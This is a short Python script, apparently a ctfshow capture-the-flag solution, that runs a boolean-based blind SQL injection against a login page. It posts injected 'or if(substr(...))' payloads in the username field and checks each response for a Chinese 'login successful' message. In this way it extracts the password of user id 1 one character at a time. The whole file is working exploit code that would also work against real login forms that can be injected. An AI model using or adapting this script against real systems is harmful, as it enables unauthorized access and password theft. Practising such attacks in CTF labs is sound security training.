import requests


url = "http://127.0.0.1/login.php"

string = "abcdefghijklmnopqrstuvwxyz0123456789";
password = ""

for i in range(10):
	for s in string:
		data={
			"username":f"xxx' or if(substr((select password from user where id = 1),{i+1},1)='{s}',1,0)#",
			"password":"ctfshow"
		}
		response = requests.post(url=url,data=data)
		if "登录成功" in response.text:
			password+=s
			break
		else:
			print(f"正在尝试第{i+1}位字符是否为{s}")


print("password is "+password)